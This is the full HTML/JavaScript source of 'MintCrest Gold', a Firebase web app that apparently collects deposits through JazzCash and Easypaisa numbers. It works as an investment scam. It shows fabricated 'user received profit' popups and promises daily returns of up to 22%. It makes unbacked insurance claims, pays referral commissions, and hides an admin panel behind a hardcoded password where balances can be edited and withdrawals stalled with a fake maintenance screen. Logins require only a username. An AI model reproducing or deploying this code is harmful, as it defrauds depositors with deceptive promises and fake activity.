<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Elite Asset Hub</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(50px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.2), transparent); }
        .page { display: none; animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; padding: 4px 8px; border-radius: 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; }
        .badge-approved { background: rgba(34, 197, 94, 0.1); color: #4ade80; padding: 4px 8px; border-radius: 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; }
        .premium-card { background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%); border: 1px solid rgba(59, 130, 246, 0.3); position: relative; overflow: hidden; }
        .premium-card::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent); transform: rotate(45deg); animation: shine 6s infinite; }
        @keyframes shine { 0% { left: -100%; } 100% { left: 100%; } }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 20s linear infinite; white-space: nowrap; }
        #live-popup { position: fixed; top: 80px; left: 50%; transform: translateX(-50%); z-index: 1000; width: 90%; max-width: 350px; display: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="bg-blue-600 py-1.5 overflow-hidden z-[500] border-b border-blue-400/30">
        <div class="animate-marquee text-[9px] font-black uppercase tracking-widest text-white/90">
            🥇 Gold: $2,045.20 (+0.5%) • ₿ BTC: $62,140.10 (-1.2%) • 💎 MCG Yield: Stable • 🚀 Join the Elite Protocol Today • Secure Multi-Sig Vaults Active
        </div>
    </div>

    <div id="live-popup" class="glass p-4 rounded-3xl flex items-center gap-3 border-l-4 border-green-500 shadow-2xl transition-all duration-500">
        <div class="text-xl">💰</div>
        <div>
            <p id="popup-text" class="text-[9px] font-black uppercase tracking-tight">User Zain just received ₨ 2,400 profit</p>
            <p class="text-[7px] opacity-40 uppercase">Blockchain Verified</p>
        </div>
    </div>

    <div id="maint-mode" class="hidden fixed inset-0 z-[10000] bg-black flex flex-col items-center justify-center p-10 text-center">
        <div class="text-6xl mb-6 animate-bounce">🛠️</div>
        <h2 class="text-2xl font-black italic mb-2">SYSTEM UPGRADE</h2>
        <p class="text-gray-400 text-xs font-bold uppercase tracking-widest">Nodes are being optimized. Back in 10 minutes, sweetie.</p>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-1 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[9px] uppercase tracking-[0.5em] mb-12 font-bold opacity-60">Digital Asset Protocol</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Choose Username" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-4 focus:border-blue-500 transition-all text-sm">
                <input type="text" id="ref-by" placeholder="Invite ID (Optional)" class="w-full bg-white/5 p-4 rounded-xl border border-white/5 outline-none text-center text-[10px] mb-8 font-bold opacity-50">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[11px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Entry</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="premium-card p-10 rounded-[3rem] mb-6 shadow-2xl">
                <div class="flex justify-between items-start mb-1">
                    <p class="text-[10px] text-blue-300 font-extrabold uppercase tracking-widest opacity-80">Capital Portfolio</p>
                    <span id="v-status" class="bg-green-500/20 text-green-400 text-[8px] px-3 py-1 rounded-full font-black uppercase">Verified</span>
                </div>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-400 uppercase italic tracking-widest">Nodes Active...</div>
                
                <div class="mt-8 grid grid-cols-2 gap-3">
                    <div class="bg-white/5 border border-white/10 px-4 py-3 rounded-2xl">
                        <p class="text-[7px] text-gray-400 uppercase font-black">Daily Profit</p>
                        <span id="v-profit" class="text-[11px] font-bold text-green-400">₨ 0</span>
                    </div>
                    <div class="bg-white/5 border border-white/10 px-4 py-3 rounded-2xl">
                        <p class="text-[7px] text-gray-400 uppercase font-black">Active Tier</p>
                        <span id="tier-tag" class="text-[10px] font-bold text-blue-400 uppercase italic">Inactive</span>
                    </div>
                </div>
            </div>
            
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] flex flex-col items-center active:scale-95 border-b-4 border-blue-600 shadow-xl">
                    <span class="text-2xl mb-2">📥</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] flex flex-col items-center active:scale-95 border-b-4 border-red-600 shadow-xl">
                    <span class="text-2xl mb-2">📤</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Withdraw</span>
                </button>
            </div>

            <div class="glass mt-6 p-6 rounded-[2.5rem] flex justify-around text-center">
                <div><p id="stat-referrals" class="text-lg font-black">0</p><p class="text-[7px] uppercase font-bold opacity-40">Network</p></div>
                <div class="border-x border-white/5 px-6"><p id="stat-days" class="text-lg font-black">1</p><p class="text-[7px] uppercase font-bold opacity-40">Days Active</p></div>
                <div><p class="text-lg font-black text-blue-400">A+</p><p class="text-[7px] uppercase font-bold opacity-40">Trust Score</p></div>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl tracking-tighter">Trading Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-4 pb-12"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400 tracking-widest">Security Ledger</h2>
            <div id="user-history" class="space-y-3 pb-12"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-blue-500 text-center">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 italic">Referral Protocol</h3>
                <div id="my-ref-id" class="text-2xl font-black py-2 tracking-tighter text-white">---</div>
                <input type="text" id="ref-link" readonly class="hidden">
                <button onclick="copyRef()" class="mt-3 bg-blue-600 px-8 py-3 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95">Copy Link</button>
            </div>

            <div class="glass p-8 rounded-[3rem] border-l-4 border-blue-600">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 italic">🛡️ Legal Protocol</h3>
                <div class="space-y-4 text-[9px] text-gray-400 font-bold uppercase tracking-tight">
                    <p>• Assets are insured by MintCrest Cold Storage.</p>
                    <p>• Withdrawals are processed within 24 standard hours.</p>
                    <p>• Single device authorization policy active.</p>
                </div>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-[10px] font-black text-red-500 uppercase tracking-widest">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm text-center italic">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black">
                    <div class="glass p-5 rounded-2xl flex justify-between bg-blue-500/5"><span>SADAPAY/JAZZCASH</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between bg-green-500/5"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/10">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-4 text-center font-bold uppercase outline-none border border-white/10">
                <label class="block w-full bg-white/5 p-6 rounded-2xl mb-8 border border-dashed border-white/20 text-center cursor-pointer">
                    <span id="file-label" class="text-[9px] font-black opacity-40 uppercase italic">📸 Upload Evidence</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('file-label').innerText = 'Screenshot Logged ✅'">
                </label>
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest shadow-xl">Verify Asset</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm text-center italic">Payout Portal</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/10">
                <input type="text" id="wd-acc" placeholder="Account Name & No" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[10px] font-bold outline-none border border-white/10">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest">Confirm Request</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Protocol Admin 4.0</h2>
            <button onclick="closeAdmin()" class="bg-red-500 text-white px-5 py-2 rounded-xl text-[9px] font-black uppercase">Exit</button>
        </div>
        
        <div class="grid grid-cols-2 gap-3 mb-8">
            <div class="glass p-5 rounded-3xl text-center border-b-4 border-blue-500">
                <p class="text-[7px] text-gray-500 uppercase font-black">Total Users</p>
                <span id="adm-total-users" class="text-xl font-black">0</span>
            </div>
            <div class="glass p-5 rounded-3xl text-center border-b-4 border-yellow-500">
                <p class="text-[7px] text-gray-500 uppercase font-black">Maintenance</p>
                <button onclick="toggleMaintenance()" id="maint-btn" class="text-[9px] font-black uppercase text-red-500">OFF</button>
            </div>
        </div>

        <div class="flex gap-2 mb-8 overflow-x-auto pb-2">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 px-6 py-2.5 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Orders</button>
            <button onclick="showAdmTab('users')" class="glass px-6 py-2.5 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Users</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-4"></div>
        
        <div id="adm-sec-users" class="adm-tab hidden space-y-3">
            <input type="text" id="user-search" oninput="filterUsers()" placeholder="Find User..." class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] font-black border border-white/10 outline-none">
            <div id="adm-user-list"></div>
        </div>

        <div class="glass p-8 rounded-[3rem] mt-8">
            <h3 class="text-[9px] font-black uppercase mb-4 opacity-30 text-center italic">Direct Control</h3>
            <input type="text" id="adm-user-edit" placeholder="Username" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-black border border-white/5 outline-none">
            <input type="number" id="adm-val-edit" placeholder="Value" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-black border border-white/5 outline-none">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Balance</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Profit</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab"><span class="text-xl">🏠</span><span class="text-[8px] font-black uppercase">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2"><span class="text-xl">📈</span><span class="text-[8px] font-black uppercase">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2"><span class="text-xl">📜</span><span class="text-[8px] font-black uppercase">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2"><span class="text-xl">🏢</span><span class="text-[8px] font-black uppercase">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0; let isMaint = false;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 2000, r: 3.8, d: 30 },
            { n: "Silver-X", p: 5000, r: 4.5, d: 30 }, { n: "Gold-X", p: 10000, r: 5.5, d: 30 },
            { n: "Diamond-Master", p: 50000, r: 8, d: 30 }, { n: "Royal-Grand", p: 100000, r: 10, d: 30 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, d: 1, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, d: 30, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
            setInterval(showFakePopup, 10000);
            listenForMaint();
        };

        function showFakePopup() {
            const names = ["Ali", "Sana", "Hamza", "Ayesha", "Daniyal", "Farwa"];
            const p = ["₨ 1,200", "₨ 5,000", "₨ 850", "₨ 12,000"];
            const pop = document.getElementById('live-popup');
            document.getElementById('popup-text').innerText = `User ${names[Math.floor(Math.random()*names.length)]} just received ${p[Math.floor(Math.random()*p.length)]} profit`;
            pop.style.display = 'flex'; setTimeout(()=>pop.style.opacity='1',100);
            setTimeout(()=>{ pop.style.opacity='0'; setTimeout(()=>pop.style.display='none',500); }, 4000);
        }

        function listenForMaint() {
            db.collection("app_data").doc("settings").onSnapshot(doc => {
                if(doc.exists && doc.data().maintenance) document.getElementById('maint-mode').classList.remove('hidden');
                else document.getElementById('maint-mode').classList.add('hidden');
            });
        }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); 
            const refBy = document.getElementById('ref-by').value.trim();
            if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) {
                // New User Welcome Bonus ₨ 100
                await ref.set({ name: name, balance: 100, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive", referredBy: refBy || "Direct" });
                alert("Welcome Sweetie! ₨ 100 Bonus Credited.");
            }
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('my-ref-id').innerText = name;
            document.getElementById('ref-link').value = window.location.origin + window.location.pathname + "?ref=" + name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { 
                user = doc.data(); 
                document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); 
                document.getElementById('tier-tag').innerText = user.tierName;
                document.getElementById('stat-days').innerText = Math.floor((Date.now() - user.time) / 86400000) + 1;
                checkProfitReq(user);
            }});
            db.collection("users").where("referredBy", "==", name).onSnapshot(snap => { document.getElementById('stat-referrals').innerText = snap.size; });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[9px] font-black uppercase italic">Protocol Idle</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { 
                    const clr = d.type.includes('dep') ? 'border-blue-500' : (d.type.includes('Profit') ? 'border-green-500' : 'border-red-500'); 
                    list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${clr} mb-2 text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; 
                });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const style = p.s ? 'border: 1px solid rgba(59,130,246,0.5) !important; background: rgba(59,130,246,0.05);' : '';
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer mb-2" style="${style}"><div><h4 class="font-black text-[11px] uppercase ${p.s ? 'text-blue-400' : 'text-gray-400'}">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily</p><p class="text-[7px] text-gray-500 font-bold uppercase mt-1">⏳ ${p.d} Days Contract</p></div><div class="text-right"><p class="font-black text-[13px]">₨ ${p.p.toLocaleString()}</p></div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("All protocol fields required!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now(), referredBy: user.referredBy || "Direct" });
                alert("Protocol Logged, Sweetie!"); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || !acc || parseInt(a) > user.balance) return alert("Balance Error!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Request Authorized!"); changePage('activity');
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) return alert("Capital Required: ₨ "+p);
            if(confirm("Establish Link with "+tName+"?")) { 
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); alert("Link Established!"); changePage('activity');
            }
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Auth Pass:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } setTimeout(()=>tapCount=0,3000); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }
        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Link Copied!"); }

        // --- Admin Control ---
        async function syncAdmin() {
            db.collection("users").onSnapshot(snap => { document.getElementById('adm-total-users').innerText = snap.size; 
                const list = document.getElementById('adm-user-list'); list.innerHTML = ''; 
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-3 rounded-xl flex justify-between items-center text-[9px] font-black uppercase mb-1 user-card" data-name="${u.name}"><div>${u.name}</div><div>₨ ${u.balance}</div></div>`; }); 
            });
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-400 px-2 py-1 rounded">📸 Proof</button>` : '';
                    list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[9px] font-black uppercase"><div>${d.user}<br>₨ ${d.amount} (${d.type})</div><div class="flex gap-2">${pBtn}<button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-2 py-1 rounded">YES</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-600 px-2 py-1 rounded">NO</button></div></div>`;
                });
            });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get(); const rSnap = await db.collection("requests").doc(id).get();
            if(act==='approved') {
                if(type==='deposit' || type.includes('Yield')) { 
                    await ref.update({ balance: (doc.data().balance||0) + amt }); 
                    // Referral Commission 10%
                    if(type==='deposit' && rSnap.data().referredBy && rSnap.data().referredBy !== 'Direct') {
                        const inviter = db.collection("users").doc(rSnap.data().referredBy); const iDoc = await inviter.get();
                        if(iDoc.exists) { 
                            const comm = amt * 0.10; await inviter.update({ balance: (iDoc.data().balance||0) + comm });
                            await db.collection("requests").add({ user: rSnap.data().referredBy, amount: comm, type: "Referral Commission", status: "approved", time: Date.now() });
                        }
                    }
                }
            } else if(act==='rejected' && type==='withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act }); 
        }

        async function toggleMaintenance() { isMaint = !isMaint; await db.collection("app_data").doc("settings").set({ maintenance: isMaint }); document.getElementById('maint-btn').innerText = isMaint ? "ON" : "OFF"; }
        async function manualEdit(f) { const u = document.getElementById('adm-user-edit').value; const v = parseInt(document.getElementById('adm-val-edit').value); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Funds Synced!"); }
        function filterUsers() { const q = document.getElementById('user-search').value.toLowerCase(); document.querySelectorAll('.user-card').forEach(c => c.style.display = c.dataset.name.toLowerCase().includes(q) ? 'flex' : 'none'); }
    </script>
</body>
</html>
